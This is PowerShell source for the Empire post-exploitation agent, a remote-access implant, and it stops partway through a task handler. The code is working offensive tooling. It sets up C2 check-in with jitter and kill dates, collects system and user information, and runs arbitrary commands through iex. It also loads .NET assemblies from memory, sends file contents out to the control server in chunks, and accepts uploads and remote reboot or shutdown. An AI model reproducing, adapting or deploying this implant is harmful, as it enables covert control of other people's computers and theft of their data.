
function Invoke-Empire {
    <#
        .SYNOPSIS
        The main functionality of the Empire agent.
        Additional functionality can be loaded dynamically.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER StagingKey
        The server staging key.

        .PARAMETER SessionKey
        Client-specific AES session key to use for communications

        .PARAMETER SessionID
        A unique alphanumeric sessionID to use for identification

        .PARAMETER Servers
        Array of C2 servers to use

        .PARAMETER KillDate
        Kill date limit for agent operation

        .PARAMETER KillDays
        Number of days for the bot to operate until exit

        .PARAMETER WorkingHours
        Working hours for agent operation, format "8:00,17:00"

        .PARAMETER Profile
        http communication profile
        request_uris(comma separated)|UserAgents(comma separated)|header1:val(eg. Accept:text/html)|header2:val2(eg. DNT:1)|...

        .PARAMETER LostLimit
        The limit of the number of checkins the agent will miss before exiting

        .PARAMETER DefaultResponse
        A base64 representation of the default response for the given transport.
    #>

    param(
        [Parameter(Mandatory=$true)]
        [String]
        $StagingKey,

        [Parameter(Mandatory=$true)]
        [String]
        $SessionKey,

        [Parameter(Mandatory=$true)]
        [String]
        $SessionID,

        [Int32]
        $AgentDelay = 60,

        [Double]
        $AgentJitter = 0,

        [String[]]
        $Servers,

        [String]
        $KillDate,

        [Int32]
        $KillDays,

        [String]
        $WorkingHours,

        [object]
        $ProxySettings,

        [String]
        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

        [Int32]
        $LostLimit = 60,

        [String]
        $DefaultResponse = ""
    )

    ############################################################
    #
    # Configuration data
    #
    ############################################################

    $Encoding = [System.Text.Encoding]::ASCII;

    $script:AgentDelay = $AgentDelay;
    $script:AgentJitter = $AgentJitter;
    $script:LostLimit = $LostLimit;
    $script:MissedCheckins = 0;
    $script:ResultIDs = @{};
    $script:WorkingHours = $WorkingHours;
    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
    $script:Proxy = $ProxySettings;
    $script:CurrentListenerName = "";
    $script:tasks = @{}

    # the currently active server
    $Script:ServerIndex = 0;
    $Script:ControlServers = $Servers;

    # the number of times to retry server connections, i.e. the 'lost limit
    $Retries = 1;

    # set a kill date of $KillDays out if specified
    if($KillDays) {
        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
    }

    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
        $script:KillDate = $KillDate
    }

    # get all the headers/etc. in line for our comms
    #   Profile format:
    #       uris(comma separated)|UserAgent|header1=val|header2=val2...
    #       headers are optional. format is "key:value"
    #       ex- cookies are "cookie:blah=123;meh=456"
    $ProfileParts = $Profile.split('|');
    $script:TaskURIs = $ProfileParts[0].split(',');
    $script:UserAgent = $ProfileParts[1];
    $script:SessionID = $SessionID;
    $script:Headers = @{};
    # add any additional request headers if there are any specified in the profile
    if($ProfileParts[2]) {
        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
            $Parts = $_.Split(':');
            $script:Headers.Add($Parts[0],$Parts[1]);
        }
    }

    $Script:Downloads = @{};
    # the currently imported script held in memory
    $script:ImportedScript = '';

    ############################################################
    #
    # Command Helpers
    #
    ############################################################

    function Get-HexString {
        param([byte]$Data)
        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' ';
    }

    function Set-Delay {
        param([int]$d, [double]$j=0.0)
        $script:AgentDelay = $d;
        $script:AgentJitter = $j;
        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter";
    }

    function Get-Delay {
        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter";
    }

    function Set-LostLimit {
        param([int]$l)
        $script:LostLimit = $l;
        if($l -eq 0)
        {
            "agent set to never die based on checkin Limit";
        }
        else
        {
            "agent LostLimit set to $script:LostLimit";
        }
    }

    function Get-LostLimit {
        "agent LostLimit: $script:LostLimit";
    }

    function Set-Killdate {
        param([string]$date)
        $script:KillDate = $date;
        "agent killdate set to $script:KillDate";
    }

    function Get-Killdate {
        "agent killdate: $script:KillDate";
    }

    function Set-WorkingHours {
        param([string]$hours)
        $script:WorkingHours = $hours;
        "agent working hours set to $($script:WorkingHours)";
    }

    function Get-WorkingHours {
        "agent working hours: $($script:WorkingHours)";
    }

    function Get-Sysinfo {
        # no nonce for normal execution
        $str = '0|';
        $str += $Script:ControlServers[$Script:ServerIndex];
        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
        #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
        $str+="|$ip";

        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
        # if we're SYSTEM, we're high integrity
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $str += '|True';
        }
        else{
            # otherwise check the token groups
            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');
        }
        $n = [System.Diagnostics.Process]::GetCurrentProcess();
        $str += '|'+$n.ProcessName+'|'+$n.Id;
        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
        $str;
    }

    # # TODO: add additional callback servers ?
    # function Add-Servers {
    #     param([string[]]$BackupServers)
    #     foreach ($backup in $BackupServers) {
    #         $Script:ControlServers = $Script:ControlServers + $backup
    #     }
    # }

    # handle shell commands and return any results
    function Invoke-ShellCommand {
        param($cmd, $cmdargs="")

        # UNC path normalization for PowerShell
        if ($cmdargs -like "*`"\\*") {
            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
        }
        elseif ($cmdargs -like "*\\*") {
            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
        }

        $output = '';
        if ($cmd.ToLower() -eq 'shell') {
            # if we have a straight 'shell' command, skip the aliases
            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
            else {
                $OldConsoleOut = [Console]::Out;
                $StringWriter = New-Object IO.StringWriter;
                [Console]::SetOut($StringWriter);
                $output = iex "$cmdargs" | out-string;
                #for somereason this was quoted again and it shouldn't need to be
                #$output = iex $cmdargs
                [Console]::SetOut($OldConsoleOut);

                if ($output.length -eq 0){
                    $output = $StringWriter.ToString();
                    }
            }
            $output += "`n`r";
        }
        elseif ($cmd.ToLower() -eq 'reflectiveload'){
            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
            else{
                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
                $output = "`n`r Reflective Load Complete";
            }
        }
        else {
            switch -regex ($cmd) {
                '(ls|^dir)' {
                    if ($cmdargs.length -eq "") {
                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
                    }
                    else {
                        try{
                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
                        }
                        catch [System.Management.Automation.ActionPreferenceStopException] {
                            $output = "[!] Error: $_ (or cannot be accessed).";
                        }
                    }
                }
                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
                    if ($cmdargs.length -ne "") {
                        try {
                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
                            $output = "executed $cmd $cmdargs";
                        }
                        catch {
                            $output=$_.Exception;
                        }
                    }
                }
                cd {
                    if ($cmdargs.length -ne '')
                    {
                        $cmdargs = $cmdargs.trim("`"").trim("'");
                        cd "$cmdargs";
                        $output = pwd;
                    }
                }
                '(ipconfig|ifconfig)' {
                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
                        $out = New-Object psobject;
                        $out | Add-Member Noteproperty 'Description' $_.Description;
                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
                        $out
                    } | ConvertTo-Json;
                }
                # this is stupid how complicated it is to get this information...
                '(ps|tasklist)' {
                    $owners = @{};
                    Get-WmiObject win32_process | ForEach-Object {
                        try {
                            $o = $_.getowner()
                            if (-not $($o.User)) {
                                $o = 'N/A'
                            } else {
                                $o = "$($o.Domain)\$($o.User)"
                            }
                        } catch {
                            $o = 'N/A'
                        }
                        $owners[$_.handle] = $o
                    }
                    if($cmdargs -ne '') { $p = $cmdargs }
                    else{ $p = "*" };
                    $output = Get-Process $p | ForEach-Object {
                        $arch = 'x64';
                        if ([System.IntPtr]::Size -eq 4) {
                            $arch = 'x86'
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                    $arch = 'x86';
                                    break
                                }
                            }
                        }
                        $out = New-Object psobject;
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
                        $out | Add-Member Noteproperty 'PID' $_.ID;
                        $out | Add-Member Noteproperty 'Arch' $arch;
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
                        $out | Add-Member Noteproperty 'MemUsage' $mem;
                        $out;
                    } | Sort-Object -Property PID | ConvertTo-Json;
                }
                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                route {
                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
                        # build a table of adapter interfaces indexes -> IP address for the adapater
                        $adapters = @{};
                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
                            $out = New-Object psobject;
                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
                            if ($_.NextHop -eq "0.0.0.0") {
                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
                            }
                            else{
                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
                            }
                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
                            }
                            else {
                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
                            }
                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
                            $out;
                        } | ConvertTo-Json;
                    }
                    else { $output = route $cmdargs };
                }
                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
                hostname {
                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
                }
                '(reboot|restart)' { Restart-Computer -force };
                shutdown { Stop-Computer -force };
                default {
                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
                    else { $output = IEX "$cmd $cmdargs" | Out-String };
                }
            }
        }
        "`n"+($output);
    }

    # takes a string representing a PowerShell script to run, build a new
    #   AppDomain and PowerShell runspace, and kick off the execution in the
    #   new runspace/AppDomain asynchronously, storing the results in $Script:tasks.
    function Start-AgentJob {
        param($ScriptString)

        # create our new AppDomain
        $AppDomain = [AppDomain]::CreateDomain($ResultID);

        # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();

        # add the target script into the new runspace/appdomain
        $null = $PSHost.AddScript($ScriptString);

        # stupid v2 compatibility...
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));

        # kick off asynchronous execution
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));

        $Script:tasks[$ResultID] = @{
            "result_id" = $ResultID
            "packet_type" = $type
            "status" = "running"
            "thread" = $Job
            "language" = $null
            "powershell" = @{
                "app_domain" = $AppDomain
                "ps_host" = $PSHost
                "buffer" = $Buffer
                "ps_host_exec" = $null
            }
        }
        $ResultID;
    }

    # returns $True if the specified job is completed, $False otherwise
    function Get-AgentJobCompleted {
        param($JobName)

        if ($script:tasks.ContainsKey($JobName)) {
            $jobCompleted = $script:tasks[$JobName]['thread'].IsCompleted

            if ($jobCompleted) {
                if ($script:tasks[$JobName]) {
                    $script:tasks[$JobName]['status'] = 'completed'
                } else {
                    return $false
                }
            }
            return $jobCompleted
        } else {
            return $false
        }
    }

    # reads any data from the output buffer preserved for the specified job
    function Receive-AgentJob {
        param($JobName)
        if($script:tasks.ContainsKey($JobName)) {
            $script:tasks[$JobName]['powershell']['buffer'].ReadAll();
        }
    }

    # stops the specified agent job (wildcards accepted), returns any job results,
    #   tear down the appdomain, and remove the job from the internal cache
    function Stop-AgentJob {
        param($JobName)
        if ($script:tasks.ContainsKey($JobName)) {
            # kill the PS host
            $Null = $script:tasks[$JobName]['powershell']['ps_host'].Stop()
            # get results
            $results = $script:tasks[$JobName]['powershell']['buffer'].ReadAll()
            # unload the app domain runner
            $Null = [AppDomain]::Unload($script:tasks[$JobName]['powershell']['app_domain'])
            # mark the job as stopped
            $script:tasks[$JobName]['status'] = 'stopped'
            # remove the job from the hashtable
            $script:tasks.Remove($JobName)
            return $results
        }
    }

    # update the http comms profile
    function Update-Profile {
        param($Profile)

        # format:
        #   uris(comma separated)|UserAgent|header1=val|header2=val2...
        #   headers are optional. format is "key:value"
        #   ex- cookies are "cookie:blah=123;meh=456"
        $ProfileParts = $Profile.split('|');
        $script:TaskURIs = $ProfileParts[0].split(',');
        $script:UserAgent = $ProfileParts[1];
        $script:SessionID = $SessionID;
        $script:Headers = @{};

        # add any additional request headers if there are any specified in the profile
        if($ProfileParts[2]) {
            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
                $Parts = $_.Split(':');
                $script:Headers.Add($Parts[0],$Parts[1]);
            }
        }

        "Agent updated with profile $Profile";
    }

    # get a binary part of a file based on $Index and $ChunkSize
    # and return a base64 encoding of that file part (by default)
    # used by download functionality for large file
    function Get-FilePart {
        Param(
            [string] $File,
            [int] $Index = 0,
            $ChunkSize = 512KB,
            [switch] $NoBase64
        )

        try {
            $f = Get-Item "$File";
            $FileLength = $f.length;
            $FromFile = [io.file]::OpenRead($File);

            if ($FileLength -lt $ChunkSize) {
                if($Index -eq 0) {
                    $buff = new-object byte[] $FileLength;
                    $count = $FromFile.Read($buff, 0, $buff.Length);
                    if($NoBase64) {
                        $buff;
                    }
                    else{
                        [System.Convert]::ToBase64String($buff);
                    }
                }
                else{
                    $Null;
                }
            }
            else{
                $buff = new-object byte[] $ChunkSize;
                $Start = $Index * $($ChunkSize);

                $null = $FromFile.Seek($Start,0);

                $count = $FromFile.Read($buff, 0, $buff.Length);

                if ($count -gt 0) {
                    if($count -ne $ChunkSize) {
                        # if we're on the last file chunk

                        # create a new array of the appropriate length
                        $buff2 = new-object byte[] $count;
                        # and copy the relevant data into it
                        [array]::copy($buff, $buff2, $count);

                        if($NoBase64) {
                            $buff2
                        }
                        else{
                            [System.Convert]::ToBase64String($buff2);
                        }
                    }
                    else{
                        if($NoBase64) {
                            $buff;
                        }
                        else{
                            [System.Convert]::ToBase64String($buff);
                        }
                    }
                }
                else{
                    $Null;
                }
            }
        }
        catch{}
        finally {
            $FromFile.Close();
        }
    }

    ############################################################
    #
    # Core agent encryption/packet processing function
    #
    ############################################################
    function New-RoutingPacket {
        param($EncData, $Meta)
        $SKB = $Encoding.GetBytes($StagingKey);
        $RoutingPacketData = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $Script:SessionId -Language 1 -Meta $Meta -Additional 0 -EncData $EncBytes
        return $RoutingPacketData
    }

    function Decode-RoutingPacket {
        param($PacketData)
        [byte[]]$SKB = [Text.Encoding]::UTF8.GetBytes($StagingKey)

        # Decode once; the function already coerces object[] to byte[]
        $pktMap = Decode-ChaChaRoutingPacket -PacketData $PacketData -StagingKeyBytes $SKB


        # Pick the entry for our session, or fall back to the first
        $fields = $null
        if ($pktMap.ContainsKey($script:SessionID)) {
            $fields = $pktMap[$script:SessionID]
        } else {
            $firstKey = $pktMap.Keys | Select-Object -First 1
            if ($firstKey) { $fields = $pktMap[$firstKey] }
        }


        # The decoder returns: @(lang, meta, add, encData)
        [byte]  $Language = [byte] $fields[0]
        [byte]  $Meta     = [byte] $fields[1]
        [UInt16]$Extra    = [UInt16]$fields[2]
        [byte[]]$EncData  = [byte[]]$fields[3]

        # Now process the encrypted payload (your existing function)
        Process-TaskingPackets $EncData
    }

    function Encode-Packet {
        param([Int16]$type, $data, [Int16]$ResultID=0)
        <#
            encode a packet for transport:
            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+
        #>

        # in case we get a result array, make sure we join everything up
        if ($data -is [System.Array]) {
            $data = $data -join "`n";
        }

        # convert data to base64 so we can support all encodings and handle on server side
        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));

        $packet = New-Object Byte[] (12 + $data.Length);

        # packet type
        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0);
        # total number of packets
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2);
        # packet number
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4);
        # task/result ID
        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6);
        # length
        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8);
        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12);

        $packet;
    }

    function Decode-Packet {
        param($packet, $offset=0)
        # we're decoding the raw decrypted bytes to [type][# of packets][packet #][task ID][length][value][remaining packet data]
        # the calling logic can keep looking through the data blob,
        #   decoding additional packets as needed
        $Type = [BitConverter]::ToUInt16($packet, 0+$offset);
        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset);
        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset);
        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset);
        $Length = [BitConverter]::ToUInt32($packet, 8+$offset);
        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)]);
        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)]);

        Remove-Variable packet;

        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining);
    }


    ############################################################
    #
    # C2 functions
    #
    ############################################################
    # process a single tasking packet extracted from a tasking and execute the functionality
    function Process-Tasking {
        param($type, $msg, $ResultID)

        try {
            $script:tasks[$ResultID] = @{
                "result_id" = $ResultID
                "packet_type" = $type
                "status" = "started"
                "thread" = $null
                "language" = $null
                "powershell" = @{
                    "app_domain" = $null
                    "ps_host" = $null
                    "buffer" = $null
                    "ps_host_exec" = $null
                }
            }

            # sysinfo request
            if($type -eq 1) {
                $script:tasks[$ResultID]['status'] = 'completed'
                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
            }
            # agent exit
            elseif($type -eq 2) {
                $msg = "[!] Agent "+$script:SessionID+" exiting";
                # this is the only time we send a message out of the normal process,
                #   because we're exited immediately after
                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
                exit;
            }

            # set proxy chain
            elseif($type -eq 34) {
                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }

            # shell command
            elseif($type -eq 40) {
                $parts = $data.Split(" ");
                # if the command has no arguments
                if($parts.Length -eq 1) {
                    $cmd = $parts[0];
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
                }
                # if the command has arguments
                else{
                    $cmd = $parts[0];
                    $cmdargs = $parts[1..$parts.length] -join " ";
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
                }
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            # file download
            elseif($type -eq 41) {

                try {
                    $ChunkSize = 512KB;

                    $Parts = $Data.Split(" ");

                    if($Parts.Length -gt 1) {
                        $Path = $Parts[0..($parts.length-2)] -join " ";
                        try {
                            $ChunkSize = $Parts[-1]/1;
                            if($Parts[-1] -notlike "*b*") {
                                # if MB/KB not specified, assume KB and adjust accordingly
                                $ChunkSize = $ChunkSize * 1024;
                            }
                        }
                        catch {
                            # if there's an error converting the last token, assume no
                            #   chunk size is specified and add the last token onto the path
                            $Path += " $($Parts[-1])";
                        }
                    }
                    else {
                        $Path = $Data;
                    }

                    $Path = $Path.Trim('"').Trim("'");

                    # hardcoded floor/ceiling limits
                    if($ChunkSize -lt 512KB) {
                        $ChunkSize = 512KB;
                    }
                    elseif($ChunkSize -gt 8MB) {
                        $ChunkSize = 8MB;
                    }
                    else {
                        $ChunkSize = 1024KB;
                    }

                    # resolve the complete paths
                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName};

                    foreach ( $File in $Path) {
                        # read in and send the specified chunk size back for as long as the file has more parts
                        $Index = 0;
                        do{
                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize;
                            $filesize = (Get-Item $file).length;

                            if($EncodedPart) {
                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart;
                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID));
                                $Index += 1;

                                # if there are more parts of the file, sleep for the specified interval
                                if ($script:AgentDelay -ne 0) {
                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay);
                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay);

                                    if ($min -eq $max) {
                                        $sleepTime = $min;
                                    }
                                    else{
                                        $sleepTime = Get-Random -minimum $min -maximum $max;
                                    }
                                    Start-Sleep -s $sleepTime;
                                }
                            }
                            [GC]::Collect();
                        } while($EncodedPart)

                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
                        $script:tasks[$ResultID]['status'] = 'completed'
                    }
                }
                catch {
                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            # file upload
            elseif($type -eq 42) {
                $parts = $data.split('|');
                $filename = $parts[0];
                $base64part = $parts[1];
                # get the raw file contents and save it to the specified location
                $Content = [System.Convert]::FromBase64String($base64part);
                try{
                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            # directory list
            elseif($type -eq 43) {
                $output = "";
                $path = "/";
                # Use user supplied directory
                if ($data.length -gt 1) {
                    $path = $data;
                }
                # if the path is root, list drives as directories
                if ($path -eq "/") {
                    $array = @();
                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false});
                    }
                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress;
                # if path doesn't exist
                } elseif (-Not (Test-Path $path -PathType Container)) {
                    $output = "Directory " + $path + " not found.";
                } else {
                # Normal conditions
                    $array = @();
                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) };
                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) };
                    # this way we always get the backslashes even if user supplied forward slashes
                    $directory = Get-Item -force -Path $path;
                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress;

                    if ($directory -eq $null)
                    {
                        $output = "User does not have access to directory " + $path;
                    }
                }
                Encode-Packet -data $output -type $type -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }

            elseif($type -eq 120){
                try {
                    $parts = $data.split(",")
                    $base64String = $parts[1..$parts.length] -join ''
                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
                    $jsonObject = $jsonString | ConvertFrom-Json

                    $commandArray = @()
                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
                        $commandArray += $keyValue.Value
                    }
                    $arguments = @(,[string[]]$commandArray)

                    $bytes = [System.Convert]::FromBase64String($parts[0]);
                    $ms = New-Object System.IO.MemoryStream
                    $output = New-Object System.IO.MemoryStream
                    $ms.Write($bytes, 0, $bytes.Length)
                    $ms.Seek(0,0) | Out-Null

                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096)
                    $bytesRead = $sr.Read($buffer, 0, $buffer.length)

                    while ($bytesRead -ne 0) {
                        $output.Write($buffer, 0, $bytesRead)
                        $bytesRead = $sr.Read($buffer, 0, $buffer.length)
                    }
                    $assemBytes = $output.ToArray()

                    $assembly = [Reflection.Assembly]::Load($assemBytes)
                    # can probably remove programtype and mainmethod. Invoke via entrypoint instead to accomodate obfuscation
                    $programType = $assembly.GetType("Program")
                    $mainMethod = $programType.GetMethod("Main")

                    $streamProp = $programType.GetProperty("OutputStream");
                    if ($streamProp) {
                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable)
                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle)
                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream)

                        $ps = [PowerShell]::Create()
                        $dict = @{
                            "assembly" = $assembly;
                            "args"     = $commandArray;
                            "pipe"     = $pipeClientStream;
                        }

                        $pipeOutput = New-Object System.IO.StringWriter
                        $originalConsoleOut = [Console]::Out

                        try {
                            $task = $ps.AddScript('
                                [CmdletBinding()]
                                param(
                                    [System.Reflection.Assembly]
                                    $assembly,

                                    [String[]]
                                    $args,

                                    [IO.Pipes.AnonymousPipeClientStream]
                                    $pipe
                                )

                                try {
                                    $writer = New-Object System.IO.StreamWriter($pipe)
                                    $writer.AutoFlush = $true
                                    $writer.WriteLine("ready")

                                    Start-Sleep -Milliseconds 1000

                                    $arguments = @(,[string[]]$args)
                                    $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
                                    $streamProp.SetValue($null, $pipe, $null)

                                    $pipeWriter = New-Object System.IO.StreamWriter($pipe)
                                    $pipeWriter.AutoFlush = $true

                                    [Console]::SetOut($pipeWriter)

                                    $assembly.EntryPoint.Invoke($null, $arguments)
                                }
                                finally {
                                    $pipe.Dispose()
                                }
                            ').AddParameters($dict).BeginInvoke()

                            $readyMessage = $streamReader.ReadLine()
                            if ($readyMessage -eq "ready") {
                                $buffer = [char[]]::new($pipeServerStream.InBufferSize)
                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                                    $pipeOutput.Write($buffer, 0, $read)
                                    $output = $pipeOutput.ToString().TrimEnd()
                                    if (-not [string]::IsNullOrWhiteSpace($output)) {
                                        Encode-Packet -data $output -type 120 -ResultID $ResultID;
                                    }
                                }
                            }
                        }
                        finally {
                            $ps.EndInvoke($task)
                            [Console]::SetOut($originalConsoleOut)
                            $pipeOutput.Close()
                            $script:tasks[$ResultID]['status'] = 'completed';
                        }
                    }
                    else {
                        $OldConsoleOut = [Console]::Out;
                        $StringWriter = New-Object IO.StringWriter;
                        [Console]::SetOut($StringWriter);

                        $null = $assembly.EntryPoint.Invoke($null, $arguments)

                        [Console]::SetOut($OldConsoleOut)
                        $result = $StringWriter.ToString()
                        Encode-Packet -data $result -type 120 -ResultID $ResultID;
                        $script:tasks[$ResultID]['status'] = 'completed';
                    }
                }
                catch {
                    Write-Host "Error while executing assembly: $_"
                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $_" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error';
                }
            }

            elseif ($type -eq 122) {
                try {
                    $parts = $data.split(",")
                    $base64String = $parts[1..$parts.length] -join ''
                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
